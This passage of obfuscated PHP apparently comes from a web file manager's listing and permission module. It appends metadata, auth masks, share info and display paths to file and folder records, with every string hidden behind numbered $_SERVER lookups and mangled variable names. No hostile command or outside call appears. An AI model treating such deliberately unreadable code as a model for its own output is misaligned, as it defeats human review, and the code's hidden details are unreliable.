$this->_listAppendFileMeta($æÃìéŒ³, $ûõÇ§ôŞ); $this->_listAppendChildren($æÃìéŒ³, $ûõÇ§ôŞ); } $this->_listAppendPath($æÃìéŒ³); $this->_listAppendAuth($æÃìéŒ³); $this->_listAppendSourceInfo($æÃìéŒ³, $ûõÇ§ôŞ); $this->_listAppendUser($æÃìéŒ³); $this->_listFilterInfo($æÃìéŒ³, $ÃÙışœÀ); $this->_listAppendAuthSecret($æÃìéŒ³); } protected function _listSourceCache($èëÊ˜úø) { $–‰ïµÎ‘ =& $_SERVER[µÅ˜º…æ]; foreach ($èëÊ˜úø as $ù§·Ï„³) { self::$cacheSourceInfo[$–‰ïµÎ‘[547] . $ù§·Ï„³[$–‰ïµÎ‘[191]]] = $ù§·Ï„³; } } protected function _listFilterInfo(&$©Ÿş—è, $šŒ´Àƒ• = false) { $İú‰³ö =& $_SERVER[µÅ˜º…æ]; foreach ($©Ÿş—è as &$¾¥³Úñ‡) { $¾¥³Úñ‡ = $this->pathInfoFilter($¾¥³Úñ‡); self::$cachePathInfo[$İú‰³ö[548] . intval($šŒ´Àƒ•) . $İú‰³ö[476] . $¾¥³Úñ‡[$İú‰³ö[191]]] = $¾¥³Úñ‡; } unset($¾¥³Úñ‡); } protected function _listMake(&$ÇÜËúô) { $Ø¢ öÜ =& $_SERVER[µÅ˜º…æ]; $ÇÜËúô[$Ø¢ öÜ[85]] = array(); $ÇÜËúô[$Ø¢ öÜ[86]] = array(); foreach ($ÇÜËúô[$Ø¢ öÜ[446]] as $­¤­ãÍæ) { $êÑüÅ“ş = $­¤­ãÍæ[$Ø¢ öÜ[500]] == 1 ? $Ø¢ öÜ[85] : $Ø¢ öÜ[86]; $ÇÜËúô[$êÑüÅ“ş][] = $­¤­ãÍæ; } unset($ÇÜËúô[$Ø¢ öÜ[446]]); } protected function _listAppendMeta(&$¼²ÜØÔ®, $²“ˆÒı°) { $ÁÒÄ‚–¥ =& $_SERVER[µÅ˜º…æ]; $½ÑÎàß„ = array($ÁÒÄ‚–¥[506] => array($ÁÒÄ‚–¥[507], $²“ˆÒı°)); $åœ³øÜß = Model($ÁÒÄ‚–¥[549])->field($ÁÒÄ‚–¥[550])->where($½ÑÎàß„)->select(); if (!$åœ³øÜß) { return; } $ü†¶ıÓ¼ = array($ÁÒÄ‚–¥[551], $ÁÒÄ‚–¥[552], $ÁÒÄ‚–¥[531]); $º×š‘òº = array(); foreach ($åœ³øÜß as $ü­Öƒï) { if (!isset($º×š‘òº[$ü­Öƒï[$ÁÒÄ‚–¥[191]]])) { $º×š‘òº[$ü­Öƒï[$ÁÒÄ‚–¥[191]]] = array(); } if (in_array($ü­Öƒï[$ÁÒÄ‚–¥[95]], $ü†¶ıÓ¼)) { continue; } if ($ü­Öƒï[$ÁÒÄ‚–¥[95]] == $ÁÒÄ‚–¥[553]) { $ü­Öƒï[$ÁÒÄ‚–¥[451]] = $ÁÒÄ‚–¥[554]; } $º×š‘òº[$ü­Öƒï[$ÁÒÄ‚–¥[191]]][$ü­Öƒï[$ÁÒÄ‚–¥[95]]] = $ü­Öƒï[$ÁÒÄ‚–¥[451]]; } foreach ($¼²ÜØÔ® as &$åÓ‹ÎàÍ) { $åÓ‹ÎàÍ[$ÁÒÄ‚–¥[555]] = !1; if (isset($º×š‘òº[$åÓ‹ÎàÍ[$ÁÒÄ‚–¥[191]]])) { $åÓ‹ÎàÍ[$ÁÒÄ‚–¥[555]] = $º×š‘òº[$åÓ‹ÎàÍ[$ÁÒÄ‚–¥[191]]]; } if ($this->fileIsLock($åÓ‹ÎàÍ) && $åÓ‹ÎàÍ[$ÁÒÄ‚–¥[502]]) { $‘›Ÿ‚³‰ = AuthModel::AUTH_EDIT | AuthModel::AUTH_REMOVE; $åÓ‹ÎàÍ[$ÁÒÄ‚–¥[502]][$ÁÒÄ‚–¥[503]] = AuthModel::authDisable($åÓ‹ÎàÍ[$ÁÒÄ‚–¥[502]][$ÁÒÄ‚–¥[503]], $‘›Ÿ‚³‰); $åÓ‹ÎàÍ[$ÁÒÄ‚–¥[502]][$ÁÒÄ‚–¥[556]][$ÁÒÄ‚–¥[502]] = $åÓ‹ÎàÍ[$ÁÒÄ‚–¥[502]][$ÁÒÄ‚–¥[503]]; } } unset($åÓ‹ÎàÍ); } protected function _listAppendFileMeta(&$»Ö†à‹, $µÊêı¬Ù) { $•àŞÑÆ =& $_SERVER[µÅ˜º…æ]; $ù©À˜ó = array_to_keyvalue($»Ö†à‹, $•àŞÑÆ[12], $•àŞÑÆ[557]); $ù©À˜ó = array_filter(array_unique($ù©À˜ó)); $ù©À˜ó = array_to_int($ù©À˜ó); if (!$ù©À˜ó) { return; } $ ¾ÓóÀ­ = array($•àŞÑÆ[558] => array($•àŞÑÆ[507], $ù©À˜ó)); $Â¶Óñ»Ø = $•àŞÑÆ[559]; $ŸÔÁÈë’ = Model($•àŞÑÆ[560])->field($Â¶Óñ»Ø)->where($ ¾ÓóÀ­)->select(); $ŸÔÁÈë’ = array_to_keyvalue($ŸÔÁÈë’, $•àŞÑÆ[557]); $û¦…¾¨« = Model($•àŞÑÆ[561])->field($•àŞÑÆ[562])->where($ ¾ÓóÀ­)->select(); $û¦…¾¨« = $û¦…¾¨« ? $û¦…¾¨« : array(); $ğ·Œš‰õ = array(); foreach ($û¦…¾¨« as $¾ô‰«ë´) { if (!isset($ğ·Œš‰õ[$¾ô‰«ë´[$•àŞÑÆ[557]]])) { $ğ·Œš‰õ[$¾ô‰«ë´[$•àŞÑÆ[557]]] = array(); } $ğ·Œš‰õ[$¾ô‰«ë´[$•àŞÑÆ[557]]][$¾ô‰«ë´[$•àŞÑÆ[95]]] = $¾ô‰«ë´[$•àŞÑÆ[451]]; } foreach ($»Ö†à‹ as &$¬²àÀ˜ú) { $¦—†“— = $¬²àÀ˜ú[$•àŞÑÆ[557]]; if (!$¦—†“— || !is_array($ŸÔÁÈë’[$¦—†“—])) { continue; } $Â¼ö„É = $ŸÔÁÈë’[$¦—†“—]; $Â¼ö„É[$•àŞÑÆ[79]] = $¬²àÀ˜ú[$•àŞÑÆ[79]]; $Â¼ö„É[$•àŞÑÆ[32]] = $¬²àÀ˜ú[$•àŞÑÆ[32]]; if (!$Â¼ö„É[$•àŞÑÆ[563]]) { Model($•àŞÑÆ[560])->fileMd5Check($Â¼ö„É); } if (!isset(self::$cacheFileInfo[$•àŞÑÆ[564] . $¦—†“—])) { self::$cacheFileInfo[$•àŞÑÆ[564] . $¦—†“—] = array_merge(array(), $Â¼ö„É); } unset($ŸÔÁÈë’[$¦—†“—][$•àŞÑÆ[87]]); $äÓ’İ Ë = isset($ğ·Œš‰õ[$¦—†“—]) && is_array($ğ·Œš‰õ[$¦—†“—]) ? $ğ·Œš‰õ[$¦—†“—] : array(); $¬²àÀ˜ú[$•àŞÑÆ[167]] = array_merge($äÓ’İ Ë, $ŸÔÁÈë’[$¦—†“—]); if (isset($¬²àÀ˜ú[$•àŞÑÆ[167]][$•àŞÑÆ[182]])) { $¬²àÀ˜ú[$•àŞÑÆ[182]] = json_decode($¬²àÀ˜ú[$•àŞÑÆ[167]][$•àŞÑÆ[182]], !0); unset($¬²àÀ˜ú[$•àŞÑÆ[167]][$•àŞÑÆ[182]]); } } unset($¬²àÀ˜ú); } protected function _listAppendSourceInfo(&$¼Ññ³ÆŒ, $¯§æøò) { $²¼¨ªâ» =& $_SERVER[µÅ˜º…æ]; $µ˜ŞœÈ² = Model($²¼¨ªâ»[565])->listData(); $˜ûŞÔ = Model($²¼¨ªâ»[514])->listData(); $¼©›Ä¨ì = Model($²¼¨ªâ»[504])->listData(); $Şªõ´Ã± = Model($²¼¨ªâ»[566])->listSimple(); $™´Ïİ†² = array_to_keyvalue($µ˜ŞœÈ², $²¼¨ªâ»[487]); $ ¾€©Ê = array_to_keyvalue_group($˜ûŞÔ, $²¼¨ªâ»[87], $²¼¨ªâ»[515]); $•Êé×ùÖ = array_to_keyvalue($¼©›Ä¨ì, $²¼¨ªâ»[87]); $¡Ú¦ñ“º = array_to_keyvalue_group($Şªõ´Ã±, $²¼¨ªâ»[191]); foreach ($¼Ññ³ÆŒ as &$ô†¥óğÙ) { $ô†¥óğÙ[$²¼¨ªâ»[90]] = array($²¼¨ªâ»[567] => 0, $²¼¨ªâ»[568] => 0, $²¼¨ªâ»[569] => 0); if (isset($•Êé×ùÖ[$ô†¥óğÙ[$²¼¨ªâ»[191]]])) { $ô†¥óğÙ[$²¼¨ªâ»[90]][$²¼¨ªâ»[570]] = 1; $ô†¥óğÙ[$²¼¨ªâ»[90]][$²¼¨ªâ»[571]] = $•Êé×ùÖ[$ô†¥óğÙ[$²¼¨ªâ»[191]]][$²¼¨ªâ»[32]]; } if ($ ¾€©Ê && $™´Ïİ†² && isset($ ¾€©Ê[$ô†¥óğÙ[$²¼¨ªâ»[191]]])) { $ô†¥óğÙ[$²¼¨ªâ»[90]][$²¼¨ªâ»[572]] = array(); foreach ($ ¾€©Ê[$ô†¥óğÙ[$²¼¨ªâ»[191]]] as $‚¿ä×òí) { $Şå¢£Íì = $™´Ïİ†²[$‚¿ä×òí]; $ô†¥óğÙ[$²¼¨ªâ»[90]][$²¼¨ªâ»[572]][] = array($²¼¨ªâ»[573] => $Şå¢£Íì[$²¼¨ªâ»[487]], $²¼¨ªâ»[509] => $Şå¢£Íì[$²¼¨ªâ»[32]], $²¼¨ªâ»[574] => $Şå¢£Íì[$²¼¨ªâ»[575]]); } } if ($¡Ú¦ñ“º && isset($¡Ú¦ñ“º[$ô†¥óğÙ[$²¼¨ªâ»[191]]])) { $ô†¥óğÙ[$²¼¨ªâ»[90]][$²¼¨ªâ»[576]] = array(); foreach ($¡Ú¦ñ“º[$ô†¥óğÙ[$²¼¨ªâ»[191]]] as $ÓÃå¾‘¡) { $ô†¥óğÙ[$²¼¨ªâ»[90]][$²¼¨ªâ»[576]] = $this->shareFilterShow($ÓÃå¾‘¡); } } } unset($ô†¥óğÙ); return $¼Ññ³ÆŒ; } protected function shareFilterShow($çÄ©¢Ó) { $åÜÛêı§ =& $_SERVER[µÅ˜º…æ]; if (!$çÄ©¢Ó) { return $çÄ©¢Ó; } $Ñš·°¶¸ = $åÜÛêı§[577]; if ($çÄ©¢Ó[$åÜÛêı§[578]] == $åÜÛêı§[91]) { $Ñš·°¶¸ .= $åÜÛêı§[579]; } if (is_array($çÄ©¢Ó[$åÜÛêı§[580]]) && is_array($çÄ©¢Ó[$åÜÛêı§[580]][$åÜÛêı§[581]])) { $çÄ©¢Ó[$åÜÛêı§[580]][$åÜÛêı§[581]] = $åÜÛêı§[582]; } if (!$€“Ñ½´[$åÜÛêı§[583]] && $€“Ñ½´[$åÜÛêı§[191]] != $åÜÛêı§[228]) { $€“Ñ½´[$åÜÛêı§[583]] = KodIO::make($€“Ñ½´[$åÜÛêı§[191]]); } $çÄ©¢Ó = array_field_key($çÄ©¢Ó, explode($åÜÛêı§[50], $Ñš·°¶¸)); return $çÄ©¢Ó; } protected function _listAppendChildren(&$²’“ßè×, $Ò£“Ÿ±å) { $«Ïìã—¯ =& $_SERVER[µÅ˜º…æ]; $†ÌÍÃÁ× = array(); $¨÷ô±Ø = array($«Ïìã—¯[239] => 0, $«Ïìã—¯[240] => 0); foreach ($²’“ßè× as &$úˆßº¤ˆ) { if (!$úˆßº¤ˆ[$«Ïìã—¯[500]]) { continue; } $†ÌÍÃÁ×[] = intval($úˆßº¤ˆ[$«Ïìã—¯[191]]); } unset($úˆßº¤ˆ); if (!$†ÌÍÃÁ×) { return; } $Ğƒˆ·® = array($«Ïìã—¯[190] => array($«Ïìã—¯[7], $†ÌÍÃÁ×), $«Ïìã—¯[520] => 0); $ì¨‹úäÙ = array($«Ïìã—¯[190], $«Ïìã—¯[500], $«Ïìã—¯[584] => $«Ïìã—¯[585]); $™–×ùáÚ = $this->field($ì¨‹úäÙ)->where($Ğƒˆ·®)->group($«Ïìã—¯[586])->select(); $·­«Óß = array(); foreach ($™–×ùáÚ as $î´¹±óâ) { $ê„Íñ‹á = $î´¹±óâ[$«Ïìã—¯[190]]; $ëÄÒºÈó = $î´¹±óâ[$«Ïìã—¯[500]] == $«Ïìã—¯[91] ? $«Ïìã—¯[240] : $«Ïìã—¯[239]; if (!isset($·­«Óß[$ê„Íñ‹á])) { $·­«Óß[$ê„Íñ‹á] = array($«Ïìã—¯[239] => 0, $«Ïìã—¯[240] => 0); } $·­«Óß[$ê„Íñ‹á][$ëÄÒºÈó] += $î´¹±óâ[$«Ïìã—¯[585]]; } foreach ($²’“ßè× as &$úˆßº¤ˆ) { if (!$úˆßº¤ˆ[$«Ïìã—¯[500]]) { continue; } $ã‰àº = is_array($·­«Óß[$úˆßº¤ˆ[$«Ïìã—¯[191]]]) ? $·­«Óß[$úˆßº¤ˆ[$«Ïìã—¯[191]]] : $¨÷ô±Ø; $úˆßº¤ˆ[$«Ïìã—¯[240]] = $ã‰àº[$«Ïìã—¯[240]]; $úˆßº¤ˆ[$«Ïìã—¯[239]] = $ã‰àº[$«Ïìã—¯[239]]; unset($úˆßº¤ˆ[$«Ïìã—¯[501]]); } unset($úˆßº¤ˆ); } protected function _listAppendAuth(&$Ú¨ìÆö) { $ãîÇÃ‰ =& $_SERVER[µÅ˜º…æ]; $ÙáŠ¦´Â = array(); foreach ($Ú¨ìÆö as $ù¡Á¦àã) { if ($ù¡Á¦àã[$ãîÇÃ‰[188]] == self::TYPE_GROUP) { $ÙáŠ¦´Â[] = intval($ù¡Á¦àã[$ãîÇÃ‰[191]]); } } if (!$ÙáŠ¦´Â) { return; } $·äú˜äÓ = array_to_keyvalue($Ú¨ìÆö, $ãîÇÃ‰[191]); $‹¬µ‘Ÿ÷ = Model($ãîÇÃ‰[587])->getSourceList($ÙáŠ¦´Â, $·äú˜äÓ); $–‚öÆ‡ = KodUser::isRoot(); foreach ($Ú¨ìÆö as $î¢Ó»Ò’ => &$ù¡Á¦àã) { $ù¡Á¦àã[$ãîÇÃ‰[502]] = $‹¬µ‘Ÿ÷[$ù¡Á¦àã[$ãîÇÃ‰[191]]]; if (!$ù¡Á¦àã[$ãîÇÃ‰[502]] && $ù¡Á¦àã[$ãîÇÃ‰[188]] == self::TYPE_GROUP) { $ù¡Á¦àã[$ãîÇÃ‰[502]] = Action($ãîÇÃ‰[588])->pathGroupAuthMake($ù¡Á¦àã[$ãîÇÃ‰[589]]); if (!$ù¡Á¦àã[$ãîÇÃ‰[502]] && !$–‚öÆ‡) { $ù¡Á¦àã[$ãîÇÃ‰[233]] = !1; $ù¡Á¦àã[$ãîÇÃ‰[232]] = !1; } } if ($ù¡Á¦àã[$ãîÇÃ‰[502]]) { $ù¡Á¦àã[$ãîÇÃ‰[233]] = AuthModel::authCheckEdit($ù¡Á¦àã[$ãîÇÃ‰[502]][$ãîÇÃ‰[503]]); $ù¡Á¦àã[$ãîÇÃ‰[232]] = AuthModel::authCheckView($ù¡Á¦àã[$ãîÇÃ‰[502]][$ãîÇÃ‰[503]]); } $this->groupPathDisplay($ù¡Á¦àã); } unset($ù¡Á¦àã); } public function _listAppendAuthSecret(&$È¡ø»‚) { $ÕÈ”Á­ =& $_SERVER[µÅ˜º…æ]; if (Model($ÕÈ”Á­[522])->get($ÕÈ”Á­[590]) != $ÕÈ”Á­[91]) { return; } static $ºÅ¢Í›º = false; if (!$ºÅ¢Í›º) { $–¹®¢ò® = Model($ÕÈ”Á­[591]); $ñşô™÷ = Model($ÕÈ”Á­[592]); $ºÅ¢Í›º = $ñşô™÷->listData(); $ºÅ¢Í›º = array_to_keyvalue($ºÅ¢Í›º, $ÕÈ”Á­[191]); $›‡ıäç = json_decode(Model($ÕÈ”Á­[522])->get($ÕÈ”Á­[593]), !0); $›‡ıäç = array_to_keyvalue($›‡ıäç, $ÕÈ”Á­[487]); foreach ($ºÅ¢Í›º as $Ù¸Æ×Í => $óÀ÷õœ) { $³Œß«‚Ñ = $›‡ıäç[$óÀ÷õœ[$ÕÈ”Á­[594]]]; if (!$³Œß«‚Ñ) { $ñşô™÷->remove($óÀ÷õœ[$ÕÈ”Á­[487]]); unset($ºÅ¢Í›º[$Ù¸Æ×Í]); continue; } $„ˆ®•è = $–¹®¢ò®->listData($³Œß«‚Ñ[$ÕÈ”Á­[502]]); if (!$„ˆ®•è) { $ñşô™÷->remove($óÀ÷õœ[$ÕÈ”Á­[487]]); unset($ºÅ¢Í›º[$Ù¸Æ×Í]); continue; } $óÀ÷õœ[$ÕÈ”Á­[502]] = $„ˆ®•è; $óÀ÷õœ[$ÕÈ”Á­[595]] = $³Œß«‚Ñ; $óÀ÷õœ[$ÕÈ”Á­[596]] = Model($ÕÈ”Á­[597])->getInfoSimpleOuter($óÀ÷õœ[$ÕÈ”Á­[541]]); $ºÅ¢Í›º[$Ù¸Æ×Í] = $óÀ÷õœ; } } $ã÷¹Ùªë = USER_ID; $³¡ÆºÊ = array(); $±¹Õ‚·Ü = $this->_listAppendPath($³¡ÆºÊ, !0); foreach ($È¡ø»‚ as $Ù¸Æ×Í => &$óÀ÷õœ) { if (!is_array($óÀ÷õœ[$ÕÈ”Á­[502]])) { continue; } if ($óÀ÷õœ[$ÕÈ”Á­[188]] != $ÕÈ”Á­[598]) { continue; } if (isset($ºÅ¢Í›º[$óÀ÷õœ[$ÕÈ”Á­[191]]])) { $Î¥íĞïÃ = $ºÅ¢Í›º[$óÀ÷õœ[$ÕÈ”Á­[191]]]; if (!is_array($óÀ÷õœ[$ÕÈ”Á­[555]])) { $óÀ÷õœ[$ÕÈ”Á­[555]] = array(); } $óÀ÷õœ[$ÕÈ”Á­[555]][$ÕÈ”Á­[599]] = $Î¥íĞïÃ[$ÕÈ”Á­[594]]; $óÀ÷õœ[$ÕÈ”Á­[502]][$ÕÈ”Á­[600]] = $Î¥íĞïÃ; $óÀ÷õœ[$ÕÈ”Á­[502]][$ÕÈ”Á­[601]] = $óÀ÷õœ[$ÕÈ”Á­[602]]; $óÀ÷õœ[$ÕÈ”Á­[502]][$ÕÈ”Á­[603]] = $ÕÈ”Á­[91]; if ($Î¥íĞïÃ[$ÕÈ”Á­[541]] != $ã÷¹Ùªë) { $óÀ÷õœ[$ÕÈ”Á­[502]][$ÕÈ”Á­[503]] = $óÀ÷õœ[$ÕÈ”Á­[502]][$ÕÈ”Á­[503]] & $Î¥íĞïÃ[$ÕÈ”Á­[502]][$ÕÈ”Á­[502]]; } continue; } $úş¬çİ‹ = $this->parentLevelArray($óÀ÷õœ[$ÕÈ”Á­[604]]); $¬ğŠ†Ë = array_reverse($úş¬çİ‹); foreach ($¬ğŠ†Ë as $öÈÅÈÖË => $Ô¡¿ŞÎØ) { if (!isset($ºÅ¢Í›º[$Ô¡¿ŞÎØ])) { continue; } $Î¥íĞïÃ = $ºÅ¢Í›º[$Ô¡¿ŞÎØ]; $óÀ÷õœ[$ÕÈ”Á­[502]][$ÕÈ”Á­[600]] = $Î¥íĞïÃ; if ($Î¥íĞïÃ[$ÕÈ”Á­[541]] != $ã÷¹Ùªë) { $óÀ÷õœ[$ÕÈ”Á­[502]][$ÕÈ”Á­[503]] = $óÀ÷õœ[$ÕÈ”Á­[502]][$ÕÈ”Á­[503]] & $Î¥íĞïÃ[$ÕÈ”Á­[502]][$ÕÈ”Á­[502]]; } $íÖ¡Â…é = $ÕÈ”Á­[12]; $Üƒø¬Ş = count($úş¬çİ‹) - $öÈÅÈÖË; for ($°íêùí‰ = 0; $°íêùí‰ < $Üƒø¬Ş; $°íêùí‰++) { if (!isset($±¹Õ‚·Ü[$úş¬çİ‹[$°íêùí‰]])) { $íÖ¡Â…é = $ÕÈ”Á­[12]; break; } $íÖ¡Â…é = $íÖ¡Â…é . rtrim($±¹Õ‚·Ü[$úş¬çİ‹[$°íêùí‰]], $ÕÈ”Á­[8]) . $ÕÈ”Á­[8]; } $óÀ÷õœ[$ÕÈ”Á­[502]][$ÕÈ”Á­[601]] = rtrim($íÖ¡Â…é, $ÕÈ”Á­[8]) . $ÕÈ”Á­[8]; break; } } unset($óÀ÷õœ); } public function groupPathDisplay(&$Îß¦í ş) { $±—…¡’ =& $_SERVER[µÅ˜º…æ]; if ($Îß¦í ş[$±—…¡’[188]] != self::TYPE_GROUP) { return; } $ã»åç¿Å = Model($±—…¡’[605])->getInfo($Îß¦í ş[$±—…¡’[589]]); $İĞÀù™Ù = $this->parentLevelArray($ã»åç¿Å[$±—…¡’[604]]); $İŒ¬…°ˆ = $±—…¡’[12]; foreach ($İĞÀù™Ù as $ĞË±ò×Ì) { $âÂÄÀÃ± = Model($±—…¡’[605])->getInfo($ĞË±ò×Ì); $İŒ¬…°ˆ .= $âÂÄÀÃ±[$±—…¡’[90]][$±—…¡’[191]] . $±—…¡’[50]; } $Îß¦í ş[$±—…¡’[606]] = $ã»åç¿Å[$±—…¡’[190]]; $Îß¦í ş[$±—…¡’[607]] = $ã»åç¿Å[$±—…¡’[604]]; $Îß¦í ş[$±—…¡’[608]] = $ã»åç¿Å[$±—…¡’[609]]; $Îß¦í ş[$±—…¡’[610]] = $İŒ¬…°ˆ . $ã»åç¿Å[$±—…¡’[90]][$±—…¡’[191]]; } protected function _listAppendPath(&$ß¡âáœ, $¡úìÃ†Ÿ = false) { $òıù§¥ =& $_SERVER[µÅ˜º…æ]; static $Ôº›äğï = array(); $¸³úÑî = array(); $’¨Ó¬äª = array(); if ($¡úìÃ†Ÿ) { return $Ôº›äğï; } foreach ($ß¡âáœ as &$ÜĞôˆó) { $ş‡Î£Ä” = $ÜĞôˆó[$òıù§¥[191]]; if ($ÜĞôˆó[$òıù§¥[500]] == $òıù§¥[91] && $ÜĞôˆó[$òıù§¥[190]] != 0) { $Ôº›äğï[$ş‡Î£Ä”] = $ÜĞôˆó[$òıù§¥[32]]; } if ($ÜĞôˆó[$òıù§¥[500]] == $òıù§¥[91] && $ÜĞôˆó[$òıù§¥[190]] == 0) { $Ôº›äğï[$ş‡Î£Ä”] = $this->_listAppendPathRoot($ÜĞôˆó, array()); } if (isset($’¨Ó¬äª[$ÜĞôˆó[$òıù§¥[604]]])) { continue; } $’¨Ó¬äª[$ÜĞôˆó[$òıù§¥[604]]] = !0; $²¶ØûŞ® = $this->parentLevelArray($ÜĞôˆó[$òıù§¥[604]]); foreach ($²¶ØûŞ® as $ÄÄÅï‚ => $ë®©…ıŞ) { if (isset($Ôº›äğï[$ë®©…ıŞ])) { continue; } if ($ÄÄÅï‚ == 0) { $Ôº›äğï[$ë®©…ıŞ] = $this->_listAppendPathRoot($ÜĞôˆó, $²¶ØûŞ®); } if ($ÄÄÅï‚ != 0) { $¸³úÑî[] = $ë®©…ıŞ; } } } unset($ÜĞôˆó); $¸³úÑî = array_unique($¸³úÑî); if (count($¸³úÑî) > 0) { $ŠÅğ‡ ¸ = array($òıù§¥[506] => array($òıù§¥[507], $¸³úÑî)); if (count($¸³úÑî) == 1) { $õ‘‘—ñ¼ = $this->sourceInfo($¸³úÑî[0]); $õˆÖ‹Ö… = is_array($õ‘‘—ñ¼) ? array($õ‘‘—ñ¼) : !1; } else { $õˆÖ‹Ö… = $this->field($òıù§¥[611])->where($ŠÅğ‡ ¸)->select(); } if (!$õˆÖ‹Ö…) { $õˆÖ‹Ö… = array(); } foreach ($õˆÖ‹Ö… as $»‘£à†) { $Ôº›äğï[$»‘£à†[$òıù§¥[191]]] = $»‘£à†[$òıù§¥[32]]; } } $Í¯’À…ô = KodIO::sourceID(IO_PATH_SYSTEM_RECYCLE); $àË¥¯· = array(); foreach ($ß¡âáœ as &$ÜĞôˆó) { $Ñ¦ıùĞ² = $ÜĞôˆó[$òıù§¥[604]]; $ƒôûŞó‹ = $òıù§¥[12]; if (isset($àË¥¯·[$Ñ¦ıùĞ²])) { $ƒôûŞó‹ = $àË¥¯·[$Ñ¦ıùĞ²]; } else { $²¶ØûŞ® = $this->parentLevelArray($ÜĞôˆó[$òıù§¥[604]]); foreach ($²¶ØûŞ® as $ÄÄÅï‚ => $ë®©…ıŞ) { if (isset($Ôº›äğï[$ë®©…ıŞ])) { $ƒôûŞó‹ .= $Ôº›äğï[$ë®©…ıŞ] . $òıù§¥[8]; } } $àË¥¯·[$Ñ¦ıùĞ²] = $ƒôûŞó‹; } $ƒôûŞó‹ .= $ÜĞôˆó[$òıù§¥[32]]; if ($ÜĞôˆó[$òıù§¥[500]] == $òıù§¥[91]) { $ƒôûŞó‹ .= $òıù§¥[8]; } $ÜĞôˆó[$òıù§¥[602]] = str_replace($òıù§¥[254], $òıù§¥[8], $ƒôûŞó‹); if ($ÜĞôˆó[$òıù§¥[190]] == $òıù§¥[228]) { $ÜĞôˆó[$òıù§¥[32]] = trim($Ôº›äğï[$ÜĞôˆó[$òıù§¥[191]]], $òıù§¥[8]); $ÜĞôˆó[$òıù§¥[602]] = $ÜĞôˆó[$òıù§¥[32]] . $òıù§¥[8]; } if (intval($ÜĞôˆó[$òıù§¥[188]]) == self::TYPE_SYSTEM) { $this->_listAppendPathRecycle($ÜĞôˆó, $²¶ØûŞ®, $Í¯’À…ô); } } unset($ÜĞôˆó); return $ß¡âáœ; } private function _listAppendPathRecycle(&$óö­“å¬, $‡ŸÂãœÎ, $Şâ†¡èç) { $‚Ó•›¬Í =& $_SERVER[µÅ˜º…æ]; if (!in_array($Şâ†¡èç, $‡ŸÂãœÎ) && $óö­“å¬[$‚Ó•›¬Í[191]] != $Şâ†¡èç) { return; } $Ü“øÑÏ = explode($‚Ó•›¬Í[8], trim($óö­“å¬[$‚Ó•›¬Í[602]], $‚Ó•›¬Í[8])); $€èè™œã = implode($‚Ó•›¬Í[8], array_slice($Ü“øÑÏ, 2)); $óö­“å¬[$‚Ó•›¬Í[602]] = $‚Ó•›¬Í[8] . LNG($‚Ó•›¬Í[612]) . $‚Ó•›¬Í[8] . ltrim($€èè™œã, $‚Ó•›¬Í[8]); $óö­“å¬[$‚Ó•›¬Í[604]] = $‚Ó•›¬Í[613] . implode($‚Ó•›¬Í[50], array_slice($‡ŸÂãœÎ, 1)) . $‚Ó•›¬Í[50]; if ($óö­“å¬[$‚Ó•›¬Í[191]] == $Şâ†¡èç) { $óö­“å¬[$‚Ó•›¬Í[604]] = $‚Ó•›¬Í[613]; $óö­“å¬[$‚Ó•›¬Í[190]] = $‚Ó•›¬Í[228]; $óö­“å¬[$‚Ó•›¬Í[32]] = LNG($‚Ó•›¬Í[612]); } $óö­“å¬[$‚Ó•›¬Í[614]] = $‚Ó•›¬Í[615]; } protected function _listAppendPathRoot(&$«æâÓŸ±, $í›Ÿê) { $±¸«‚åå =& $_SERVER[µÅ˜º…æ]; static $Æ¬ëÉŒ¢ = false; static $ïØ™°·¬ = false; $Øş’«Ï = $±¸«‚åå[12]; if ($«æâÓŸ±[$±¸«‚åå[188]] == self::TYPE_USER) { if ($«æâÓŸ±[$±¸«‚åå[589]] == USER_ID) { $Øş’«Ï = LNG($±¸«‚åå[616]); if ($Æ¬ëÉŒ¢ === !1) { $·óÁ·Ì± = Model($±¸«‚åå[617])->getInfoFull(USER_ID); $Æ¬ëÉŒ¢ = _get($·óÁ·Ì±, $±¸«‚åå[618], $±¸«‚åå[12]); } if ($ïØ™°·¬ === !1) { $·óÁ·Ì± = Model($±¸«‚åå[617])->getInfoFull(USER_ID); $ïØ™°·¬ = _get($·óÁ·Ì±, $±¸«‚åå[619], $±¸«‚åå[12]); } if ($í›Ÿê && $í›Ÿê[0] == $Æ¬ëÉŒ¢ || !$í›Ÿê && $«æâÓŸ±[$±¸«‚åå[191]] == $Æ¬ëÉŒ¢) { $Øş’«Ï = LNG($±¸«‚åå[620]); $«æâÓŸ±[$±¸«‚åå[621]] = $±¸«‚åå[622]; } if ($í›Ÿê && $í›Ÿê[0] == $ïØ™°·¬ || !$í›Ÿê && $«æâÓŸ±[$±¸«‚åå[191]] == $ïØ™°·¬) { $Øş’«Ï = $Øş’«Ï . $±¸«‚åå[623] . LNG($±¸«‚åå[624]); } if (!$í›Ÿê) { $«æâÓŸ±[$±¸«‚åå[32]] = $Øş’«Ï; } } else { $·óÁ·Ì± = Model($±¸«‚åå[617])->getInfoFull($«æâÓŸ±[$±¸«‚åå[589]]); $±…Ş½ò = _get($·óÁ·Ì±, $±¸«‚åå[619], $±¸«‚åå[12]); $«æâÓŸ±[$±¸«‚åå[625]] = Model($±¸«‚åå[597])->getInfoSimpleOuter($«æâÓŸ±[$±¸«‚åå[589]]); $Øş’«Ï = LNG($±¸«‚åå[626]) . $±¸«‚åå[173] . $«æâÓŸ±[$±¸«‚åå[625]][$±¸«‚åå[32]] . $±¸«‚åå[175]; if ($í›Ÿê && $í›Ÿê[0] == $±…Ş½ò || !$í›Ÿê && $«æâÓŸ±[$±¸«‚åå[191]] == $±…Ş½ò) { $Øş’«Ï = LNG($±¸«‚åå[626]) . $±¸«‚åå[627] . $«æâÓŸ±[$±¸«‚åå[625]][$±¸«‚åå[32]] . $±¸«‚åå[623] . LNG($±¸«‚åå[624]) . $±¸«‚åå[175]; } } } else { if ($«æâÓŸ±[$±¸«‚åå[188]] == self::TYPE_GROUP) { $¯òüœµ• = Model($±¸«‚åå[605])->getInfoSimple($«æâÓŸ±[$±¸«‚åå[589]]); $Øş’«Ï = $¯òüœµ•[$±¸«‚åå[32]]; } else { if ($«æâÓŸ±[$±¸«‚åå[188]] == self::TYPE_SYSTEM) { $Øş’«Ï = $±¸«‚åå[628]; } } } $Øş’«Ï = $Øş’«Ï ? $±¸«‚åå[8] . $Øş’«Ï . $±¸«‚åå[8] : $±¸«‚åå[8]; return $Øş’«Ï; } protected function _listAppendUser(&$•ôŠÀæ) { $ÔòüÌ´ =& $_SERVER[µÅ˜º…æ]; $‡âËşüà = array_to_keyvalue($•ôŠÀæ, $ÔòüÌ´[12], 